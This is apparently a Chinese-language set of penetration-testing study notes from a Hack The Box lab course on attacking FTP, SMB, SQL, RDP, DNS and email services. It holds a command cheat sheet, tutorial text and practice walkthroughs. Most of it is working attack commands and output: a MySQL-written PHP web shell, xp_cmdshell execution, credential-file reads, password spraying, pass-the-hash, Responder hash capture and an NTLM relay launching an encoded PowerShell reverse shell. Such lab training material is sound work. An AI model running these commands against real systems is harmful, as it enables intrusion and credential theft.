MSSQL 服务器。</td></tr><tr><td><code>sqsh -S 10.129.203.7 -U .\\julio -P &#39;MyPassword!&#39; -h</code></td><td>从 Linux 连接到 MSSQL 服务器，而 MSSQL 服务器使用 Windows 身份验证机制。</td></tr><tr><td><code>mysql&gt; SHOW DATABASES;</code></td><td>显示 MySQL 中的所有可用数据库。</td></tr><tr><td><code>mysql&gt; USE htbusers;</code></td><td>在 MySQL 中选择一个特定的数据库。</td></tr><tr><td><code>mysql&gt; SHOW TABLES;</code></td><td>在 MySQL 中显示所选数据库中的所有可用表。</td></tr><tr><td><code>mysql&gt; SELECT * FROM users;</code></td><td>从MySQL中的“用户”表中选择所有可用条目。</td></tr><tr><td><code>sqlcmd&gt; SELECT name FROM master.dbo.sysdatabases</code></td><td>显示 MSSQL 中的所有可用数据库。</td></tr><tr><td><code>sqlcmd&gt; USE htbusers</code></td><td>在 MSSQL 中选择特定的数据库。</td></tr><tr><td><code>sqlcmd&gt; SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES</code></td><td>在 MSSQL 中显示所选数据库中的所有可用表。</td></tr><tr><td><code>sqlcmd&gt; SELECT * FROM users</code></td><td>从 MSSQL 中的“用户”表中选择所有可用条目。</td></tr><tr><td><code>sqlcmd&gt; EXECUTE sp_configure &#39;show advanced options&#39;, 1</code></td><td>允许更改高级选项。</td></tr><tr><td><code>sqlcmd&gt; EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1</code></td><td>启用xp_cmdshell。</td></tr><tr><td><code>sqlcmd&gt; RECONFIGURE</code></td><td>在每个sp_configure命令之后使用以应用更改。</td></tr><tr><td><code>sqlcmd&gt; xp_cmdshell &#39;whoami&#39;</code></td><td>从 MSSQL 服务器执行系统命令。</td></tr><tr><td><code>mysql&gt; SELECT &quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot; INTO OUTFILE &#39;/var/www/html/webshell.php&#39;</code></td><td>使用 MySQL 创建一个文件。</td></tr><tr><td><code>mysql&gt; show variables like &quot;secure_file_priv&quot;;</code></td><td>检查安全文件权限是否为空，以读取系统上本地存储的文件。</td></tr><tr><td><code>sqlcmd&gt; SELECT * FROM OPENROWSET(BULK N&#39;C:/Windows/System32/drivers/etc/hosts&#39;, SINGLE_CLOB) AS Contents</code></td><td>读取 MSSQL 中的本地文件。</td></tr><tr><td><code>mysql&gt; select LOAD_FILE(&quot;/etc/passwd&quot;);</code></td><td>在 MySQL 中读取本地文件。</td></tr><tr><td><code>sqlcmd&gt; EXEC master..xp_dirtree &#39;\\10.10.110.17\share\&#39;</code></td><td>使用 MSSQL 中的命令进行哈希窃取。<code>xp_dirtree</code></td></tr><tr><td><code>sqlcmd&gt; EXEC master..xp_subdirs &#39;\\10.10.110.17\share\&#39;</code></td><td>使用 MSSQL 中的命令进行哈希窃取。<code>xp_subdirs</code></td></tr><tr><td><code>sqlcmd&gt; SELECT srvname, isremote FROM sysservers</code></td><td>标识 MSSQL 中的链接服务器。</td></tr><tr><td><code>sqlcmd&gt; EXECUTE(&#39;select @@servername, @@version, system_user, is_srvrolemember(&#39;&#39;sysadmin&#39;&#39;)&#39;) AT [10.0.0.12\SQLEXPRESS]</code></td><td>标识用户及其在 MSSQL 中用于远程连接的权限。</td></tr></tbody></table><hr><h2 id="攻击-RDP"><a href="#攻击-RDP" class="headerlink" title="攻击 RDP"></a>攻击 RDP</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c &#39;password123&#39;</code></td><td>针对 RDP 服务喷洒密码。</td></tr><tr><td><code>hydra -L usernames.txt -p &#39;password123&#39; 192.168.2.143 rdp</code></td><td>暴力破解 RDP 服务。</td></tr><tr><td><code>rdesktop -u admin -p password123 192.168.2.143</code></td><td>在 Linux 中使用连接到 RDP 服务。<code>rdesktop</code></td></tr><tr><td><code>tscon #&#123;TARGET_SESSION_ID&#125; /dest:#&#123;OUR_SESSION_NAME&#125;</code></td><td>在没有密码的情况下模拟用户。</td></tr><tr><td><code>net start sessionhijack</code></td><td>执行 RDP 会话劫持。</td></tr><tr><td><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></td><td>在目标 Windows 主机上启用“受限管理模式”。</td></tr><tr><td><code>xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA</code></td><td>使用哈希传递技术在没有密码的情况下登录目标主机。</td></tr></tbody></table><hr><h2 id="攻击域名解析"><a href="#攻击域名解析" class="headerlink" title="攻击域名解析"></a>攻击域名解析</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>dig AXFR @ns1.inlanefreight.htb inlanefreight.htb</code></td><td>对特定名称服务器执行 AXFR 区域传输尝试。</td></tr><tr><td><code>subfinder -d inlanefreight.com -v</code></td><td>暴力破解子域。</td></tr><tr><td><code>host support.inlanefreight.com</code></td><td>指定子域的 DNS 查找。</td></tr></tbody></table><hr><h2 id="攻击电子邮件服务"><a href="#攻击电子邮件服务" class="headerlink" title="攻击电子邮件服务"></a>攻击电子邮件服务</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>host -t MX microsoft.com</code></td><td>指定域的邮件服务器的 DNS 查找。</td></tr><tr><td>&#96;dig mx inlanefreight.com</td><td>grep “MX”</td></tr><tr><td><code>host -t A mail1.inlanefreight.htb.</code></td><td>指定子域的 IPv4 地址的 DNS 查找。</td></tr><tr><td><code>telnet 10.10.110.20 25</code></td><td>连接到 SMTP 服务器。</td></tr><tr><td><code>smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</code></td><td>对指定主机使用 RCPT 命令进行 SMTP 用户枚举。</td></tr><tr><td><code>python3 o365spray.py --validate --domain msplaintext.xyz</code></td><td>验证指定域的 Office365 使用情况。</td></tr><tr><td><code>python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz</code></td><td>枚举在指定域上使用 Office365 的现有用户。</td></tr><tr><td><code>python3 o365spray.py --spray -U usersfound.txt -p &#39;March2022!&#39; --count 1 --lockout 1 --domain msplaintext.xyz</code></td><td>针对对指定域使用 Office365 的用户列表进行密码喷涂。</td></tr><tr><td><code>hydra -L users.txt -p &#39;Company01!&#39; -f 10.10.110.20 pop3</code></td><td>暴力破解 POP3 服务。</td></tr><tr><td><code>swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header &#39;Subject: Notification&#39; --body &#39;Message&#39; --server 10.10.11.213</code></td><td>测试 SMTP 服务是否存在开放中继漏洞。</td></tr></tbody></table><h1 id="Attacking-FTP-1"><a href="#Attacking-FTP-1" class="headerlink" title="Attacking FTP"></a>Attacking FTP</h1><h4 id="Brute-Forcing-1"><a href="#Brute-Forcing-1" class="headerlink" title="Brute Forcing"></a>Brute Forcing</h4><h4 id="FTP-Bounce-Attack"><a href="#FTP-Bounce-Attack" class="headerlink" title="FTP Bounce Attack"></a>FTP Bounce Attack</h4><p>FTP反弹攻击 FTP反弹攻击是一种使用FTP服务器将出站流量传递到网络上另一个设备的网络攻击。攻击者使用PORT命令诱骗FTP连接运行命令并从预期服务器以外的设备获取信息。 假设我们的目标是暴露在互联网上的FTP服务器FTP_DMZ。同一网络中的另一个设备Internal_DMZ没有暴露在互联网上。我们可以使用与FTP_DMZ服务器的连接，使用FTP Bounce攻击扫描Internal_DMZ，并获取有关服务器打开端口的信息。然后，我们可以将这些信息作为攻击基础设施的一部分。</p><p>Nmap-b标志可用于执行FTP反弹攻击：</p><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2</code></pre><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>FTP 服务在哪个端口上运行？</p><p>FTP 服务器可以使用什么用户名？</p><p>使用发现的用户名及其密码通过SSH登录并获取标志.txt文件。提交内容作为您的答案。</p></blockquote><p>先扫描主机：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111503815.png" alt="image-20230811150309711">发现都有防火墙保护，挨个端口扫描发现2121端口开了ftp服务</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111504966.png" alt="image-20230811150445925"></p><p>他这里允许匿名登录ftp，链接上去后发现了一个密码本和一个用户列表，用hydra或者Medusa爆破一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111506125.png" alt="image-20230811150617076"></p><p>然后ssh登录即可</p><h1 id="Attacking-SMB"><a href="#Attacking-SMB" class="headerlink" title="Attacking SMB"></a>Attacking SMB</h1><p>根据SMB实现和操作系统的不同，我们将使用Nmap获得不同的信息。请记住，在针对Windows操作系统时，版本信息通常不会包含在Nmap扫描结果中。相反，Nmap将尝试猜测操作系统的版本。然而，我们通常需要其他扫描来确定目标是否容易受到特定攻击。我们将在本节稍后介绍搜索已知漏洞。现在，让我们扫描端口139和445 TCP。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CESTNmap scan report for 10.129.14.128Host is up (0.00024s latency).PORT    STATE SERVICE     VERSION139/tcp open  netbios-ssn Samba smbd 4.6.2445/tcp open  netbios-ssn Samba smbd 4.6.2MAC Address: 00:00:00:00:00:00 (VMware)Host script results:|_nbstat: NetBIOS name: HTB, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2021-09-19T13:16:04|_  start_date: N/A</code></pre><p>Nmap扫描揭示了目标的基本信息： SMB版本（Samba-smbd 4.6.2） 主机名HTB 操作系统是基于SMB实现的Linux</p><h4 id="Anonymous-Authentication"><a href="#Anonymous-Authentication" class="headerlink" title="Anonymous Authentication"></a>Anonymous Authentication</h4><p>如果我们找到一个不需要用户名和密码或找到有效凭据的SMB服务器，我们可以获得共享、用户名、组、权限、策略、服务等的列表。大多数与SMB交互的工具都允许空会话连接，包括smbclient、smbmap、rpcclient或enum4linux。让我们探讨一下如何使用null身份验证与文件共享和RPC进行交互。</p><h4 id="File-Share"><a href="#File-Share" class="headerlink" title="File Share"></a>File Share</h4><p>使用smbclient，我们可以使用选项-L显示服务器的共享列表，使用选项-N，我们告诉smbclient使用null会话。</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbclient -N -L //10.129.14.128        Sharename       Type      Comment        -------      --     -------        ADMIN$          Disk      Remote Admin        C$              Disk      Default share        notes           Disk      CheckIT        IPC$            IPC       IPC Service (DEVSM)SMB1 disabled no workgroup available</code></pre><p>Smbmap是另一个帮助我们枚举网络共享和访问相关权限的工具。smbmap的一个优点是它为每个共享文件夹提供了一个权限列表。</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                           Disk                                                    Permissions     Comment        --                                                   ---------    -------        ADMIN$                                                  NO ACCESS       Remote Admin        C$                                                      NO ACCESS       Default share        IPC$                                                    READ ONLY       IPC Service (DEVSM)        notes                                                   READ, WRITE     CheckIT</code></pre><p>使用带有-r或-r（递归）选项的smbmap，可以浏览目录：</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 -r notes[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                                   Disk                                                    Permissions     Comment        --                                                   ---------    -------        notes                                                   READ, WRITE        .\notes\*        dr--r--r               0 Mon Nov  2 00:57:44 2020    .        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup</code></pre><p>从上面的例子中，权限被设置为READ和WRITE，可以用来上传和下载文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 --download &quot;notes\note.txt&quot;[+] Starting download: notes\note.txt (116 bytes)[+] File output to: /htb/10.129.14.128-notes_note.txt</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt &quot;notes\test.txt&quot;[+] Starting upload: test.txt (20 bytes)[+] Upload complete.</code></pre><h4 id="Remote-Procedure-Call-RPC"><a href="#Remote-Procedure-Call-RPC" class="headerlink" title="Remote Procedure Call (RPC)"></a>Remote Procedure Call (RPC)</h4><p>我们可以使用带有空会话的rpcclient工具来枚举工作站或域控制器。 rpcclient工具为我们提供了许多不同的命令，用于在SMB服务器上执行特定功能，以收集信息或修改服务器属性（如用户名）。我们可以使用SANS研究所的这份备忘单，也可以查看客户端手册页上所有这些功能的完整列表。</p><pre><code class="shell-session">Tanin@htb[/htb]$ rpcclient -U&#39;%&#39; 10.10.110.17rpcclient $&gt; enumdomusersuser:[mhope] rid:[0x641]user:[svc-ata] rid:[0xa2b]user:[svc-bexec] rid:[0xa2c]user:[roleary] rid:[0xa36]user:[smorgan] rid:[0xa37]</code></pre><p>Brute Forcing和密码喷雾 当暴力强制时，我们会对一个帐户尝试尽可能多的密码，但如果我们达到阈值，它会锁定一个帐户。我们可以使用暴力，如果我们知道的话，可以在达到阈值之前停止。否则，我们不建议使用暴力。 密码喷洒是一个更好的选择，因为我们可以用一个通用密码锁定用户名列表，以避免帐户锁定。如果我们知道帐户锁定阈值，我们可以尝试多个密码。通常，两到三次尝试是安全的，只要我们在两次尝试之间等待30-60分钟。让我们探索一下<a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> 工具，它包括执行密码喷涂的功能。 使用CrackMapExec（CME），我们可以针对多个IP，使用大量用户和密码。让我们来探索一个密码喷涂的日常使用案例。要对一个IP执行密码喷洒，我们可以使用选项-u指定带有用户列表的文件，使用选项-p指定密码。这将尝试使用提供的密码对列表中的每个用户进行身份验证。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &#39;Company01!&#39; --local-authSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE </code></pre><blockquote><p>注意：默认情况下，CME将在成功登录后退出。使用–continue-on-success标志将继续喷洒，即使在找到有效密码后也是如此。它对于向大型用户列表喷洒单个密码非常有用。此外，如果我们的目标是一台未加入域的计算机，我们将需要使用选项–local-auth。有关更详细的研究密码喷洒，请参阅Active Directory枚举和攻击模块。</p></blockquote><h4 id="Remote-Code-Execution-RCE"><a href="#Remote-Code-Execution-RCE" class="headerlink" title="Remote Code Execution (RCE)"></a>Remote Code Execution (RCE)</h4><h4 id="Impacket-PsExec"><a href="#Impacket-PsExec" class="headerlink" title="Impacket PsExec"></a>Impacket PsExec</h4><pre><code class="shell-session">Tanin@htb[/htb]$ impacket-psexec administrator:&#39;Password123!&#39;@10.10.110.17</code></pre><h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>我们可以用来运行CMD或PowerShell的另一个工具是CrackMapExec。CrackMapExec的一个优点是可以一次在多个主机上运行命令。要使用它，我们需要指定协议、smb、IP地址或IP地址范围，选项-u表示用户名，-p表示密码，选项-x用于运行cmd命令，大写-x用于运行PowerShell命令。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p &#39;Password123!&#39; -x &#39;whoami&#39; --exec-method smbexecSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexecSMB         10.10.110.17 445    WIN7BOX  nt authority\system</code></pre><blockquote><p>注意：如果没有定义–exec方法，CrackMapExec将尝试执行atexec方法，如果失败，您可以尝试指定–exec方式smbexec。</p></blockquote><h4 id="Enumerating-Logged-on-Users"><a href="#Enumerating-Logged-on-Users" class="headerlink" title="Enumerating Logged-on Users"></a>Enumerating Logged-on Users</h4><p>想象一下，我们在一个有多台机器的网络中。其中一些共享相同的本地管理员帐户。在这种情况下，我们可以使用CrackMapExec枚举同一网络中所有机器上的登录用户10.10.110.17&#x2F;24，这加快了我们的枚举过程。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p &#39;Password123!&#39; --loggedon-users</code></pre><h4 id="Extract-Hashes-from-SAM-Database"><a href="#Extract-Hashes-from-SAM-Database" class="headerlink" title="Extract Hashes from SAM Database"></a>Extract Hashes from SAM Database</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p &#39;Password123!&#39; --sam</code></pre><h4 id="Pass-the-Hash-PtH"><a href="#Pass-the-Hash-PtH" class="headerlink" title="Pass-the-Hash (PtH)"></a>Pass-the-Hash (PtH)</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></pre><h4 id="Forced-Authentication-Attacks"><a href="#Forced-Authentication-Attacks" class="headerlink" title="Forced Authentication Attacks"></a>Forced Authentication Attacks</h4><p>我们还可以通过创建假SMB服务器来捕获用户的NetNTLM v1&#x2F;v2哈希，从而滥用SMB协议。 执行此类操作的最常见工具是Responder。Responder是一种LLMNR、NBT-NS和MDNS投毒器工具，具有不同的功能，其中之一是可以设置虚假服务，包括SMB，以窃取NetNTLM v1&#x2F;v2哈希。在其默认配置中，它将查找LLMNR和NBT-NS流量。然后，它将代表受害者正在寻找的服务器进行响应，并捕获他们的NetNTLM哈希。 让我们举例说明Responder是如何工作的。想象一下，我们使用响应程序默认配置创建了一个假的SMB服务器，并使用以下命令：</p><pre><code class="shell-session">Tanin@htb[/htb]$ responder -I &lt;interface name&gt;</code></pre><p>假设用户错误地键入了共享文件夹的名称\mysharefoder\，而不是\mysharedfolder\。在这种情况下，所有名称解析都将失败，因为名称不存在，并且机器将向网络上的所有设备发送多播查询，包括我们运行的假冒SMB服务器。这是一个问题，因为没有采取任何措施来验证答复的完整性。攻击者可以通过监听此类查询和欺骗响应来利用这一机制，使受害者相信恶意服务器是可信的。这种信任通常用于窃取凭据。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo responder -I ens33                                         __                 .----.-----.-----.-----.-----.-----.--|  |.-----.----.  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                   |__|                         NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0                 Author: Laurent Gaffie (laurent.gaffie@gmail.com)  To kill this script hit CTRL-C[+] Poisoners:                    LLMNR                      [ON]    NBT-NS                     [ON]            DNS/MDNS                   [ON]                                                                                                                                                                                             [+] Servers:             HTTP server                [ON]                                       HTTPS server               [ON]    WPAD proxy                 [OFF]                                      Auth proxy                 [OFF]    SMB server                 [ON]                                       Kerberos server            [ON]                                       SQL server                 [ON]                                       FTP server                 [ON]                                       IMAP server                [ON]                                       POP3 server                [ON]                                       SMTP server                [ON]                                       DNS server                 [ON]                                       LDAP server                [ON]    RDP server                 [ON]    DCE-RPC server             [ON]    WinRM server               [ON]                                                                                                                      [+] HTTP Options:                                                                      Always serving EXE         [OFF]                                                   Serving EXE                [OFF]                                                   Serving HTML               [OFF]                                                   Upstream Proxy             [OFF]                                               [+] Poisoning Options:                                                                 Analyze Mode               [OFF]                                                   Force WPAD auth            [OFF]                                                   Force Basic Auth           [OFF]                                                   Force LM downgrade         [OFF]                                                   Fingerprint hosts          [OFF]                                               [+] Generic Options:                                                                   Responder NIC              [tun0]                                                  Responder IP               [10.10.14.198]                                          Challenge set              [random]                                                Don&#39;t Respond To Names     [&#39;ISATAP&#39;]                                          [+] Current Session Variables:                                                         Responder Machine Name     [WIN-2TY1Z1CIGXH]       Responder Domain Name      [HF2L.LOCAL]                                            Responder DCE-RPC Port     [48162] [+] Listening for events... [*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local[SMB] NTLMv2-SSP Client   : 10.10.110.17[SMB] NTLMv2-SSP Username : WIN7BOX\demouser[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000</code></pre><p>已破解NTLMv2哈希。密码是P@ssword.如果我们无法破解哈希，我们可以使用impacket ntlmrelayx或Responder MultiRelay.py将捕获的哈希中继到另一台机器。让我们看看使用impacket-ntlmrelay的示例。</p><p>首先，我们需要在响应程序配置文件（&#x2F;etc&#x2F;responser&#x2F;responder.conf）中将SMB设置为OFF。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/responder/Responder.conf | grep &#39;SMB =&#39;SMB = Off</code></pre><p>然后，我们使用选项–no http server、-sb2support执行impacket-ntlmrelayx，并使用选项-t执行目标机器。默认情况下，impacket-ntlmrelayx将转储SAM数据库，但我们可以通过添加选项-c来执行命令。</p><p>我们可以使用创建PowerShell反向shell<a href="https://www.revshells.com/%EF%BC%8C%E8%AE%BE%E7%BD%AE%E6%88%91%E4%BB%AC%E7%9A%84%E6%9C%BA%E5%99%A8IP%E5%9C%B0%E5%9D%80%E3%80%81%E7%AB%AF%E5%8F%A3%E5%92%8C%E9%80%89%E9%A1%B9Powershell#3%EF%BC%88Base64%EF%BC%89%E3%80%82">https://www.revshells.com/，设置我们的机器IP地址、端口和选项Powershell#3（Base64）。</a></p><pre><code class="shell-session">Tanin@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#39;</code></pre><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><blockquote><p>具有读取权限的共享文件夹的名称是什么？</p><p>用户名“jason”的密码是什么？</p><p>通过SSH以用户“jason”身份登录并找到标志.txt文件。提交内容作为您的答案。</p></blockquote><p>使用smbmap：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111559845.png" alt="image-20230811155958797"></p><p>根据给出的用户名爆破一下密码：</p><pre><code>crackmapexec smb 10.129.203.6 -u jason -p passwords.list --local-auth </code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111612302.png" alt="image-20230811161236259"></p><p>这里使用ssh链接但是失败了，尝试使用rce</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111624866.png" alt="image-20230811162433821"></p><p>impact没有写权限，无语</p><h1 id="Attacking-SQL-Databases"><a href="#Attacking-SQL-Databases" class="headerlink" title="Attacking SQL Databases"></a>Attacking SQL Databases</h1><p>默认情况下，MSSQL使用端口TCP&#x2F;1433和UDP&#x2F;1434，MySQL使用TCP&#x2F;3306。但是，当MSSQL在“隐藏”模式下运行时，它使用TCP&#x2F;2433端口。我们可以使用Nmap的默认脚本-sC选项来枚举目标系统上的数据库服务</p><h4 id="MySQL-Connecting-to-the-SQL-Server"><a href="#MySQL-Connecting-to-the-SQL-Server" class="headerlink" title="MySQL - Connecting to the SQL Server"></a>MySQL - Connecting to the SQL Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13</code></pre><h4 id="Sqlcmd-Connecting-to-the-SQL-Server"><a href="#Sqlcmd-Connecting-to-the-SQL-Server" class="headerlink" title="Sqlcmd - Connecting to the SQL Server"></a>Sqlcmd - Connecting to the SQL Server</h4><pre><code class="cmd-session">C:\htb&gt; sqlcmd -S SRVMSSQL -U julio -P &#39;MyPassword!&#39; -y 30 -Y 30</code></pre><p>注意：当我们使用sqlcmd向MSSQL进行身份验证时，我们可以使用参数-y（SQLCMDMAXVARTYPEWIDTH）和-y（SQLCMDMAXFIXEDTYPEWIDTH）来获得更好的输出。请记住，这可能会影响性能。</p><p>如果我们的目标是来自Linux的MSSQL，我们可以使用sqsh作为sqlcmd的替代方案：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P &#39;MyPassword!&#39; -hsqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. GrayPortions Copyright (C) 2004-2014 Michael Peppler and Martin WesdorpThis is free software with ABSOLUTELY NO WARRANTYFor more information type &#39;\warranty&#39;1&gt;</code></pre><p>或者，我们可以使用Impacket中名为mssqlclient.py的工具。</p><pre><code class="shell-session">Tanin@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 </code></pre><h2 id="Execute-Commands"><a href="#Execute-Commands" class="headerlink" title="Execute Commands"></a>Execute Commands</h2><p>在攻击公共服务时，命令执行是最需要的功能之一，因为它允许我们控制操作系统。如果我们有适当的权限，我们可以使用SQL数据库执行系统命令或创建必要的元素来执行。</p><p>MSSQL有一个名为xp_cmdshell的扩展存储过程，它允许我们使用SQL执行系统命令。请记住以下关于xp_cmdshell的内容： xpcmdshell是一个强大的功能，默认情况下是禁用的。xp_cmdshell可以通过使用基于策略的管理或执行sp_configure来启用和禁用 xp_cmdshell派生的Windows进程与SQL Server服务帐户具有相同的安全权限 xp_cmdshell同步运行。在命令shell命令完成之前，控件不会返回给调用方 要在MSSQL上使用SQL语法执行命令，请使用：</p><pre><code class="cmd-session">1&gt; xp_cmdshell &#39;whoami&#39;2&gt; 